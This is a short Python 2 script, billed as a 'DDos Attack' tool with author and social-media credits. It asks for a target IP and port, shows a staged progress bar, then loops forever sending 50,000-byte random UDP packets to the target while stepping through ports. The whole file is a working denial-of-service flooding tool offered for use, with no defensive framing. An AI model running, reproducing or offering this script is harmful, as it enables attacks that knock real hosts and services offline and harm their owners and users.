import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(50000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : makara"
print "You Tube :https://youtu.be/mCxYQxXVMZM?si=3ZwYISKqaSJ2xq6A"
print "github   :https://github.com/soreungmakara2/Makra"
print "Facebook :https://www.facebook.com/profile.php?id=100083469490183&mibextid=vk8aRt"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 8
     port = port + 10
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
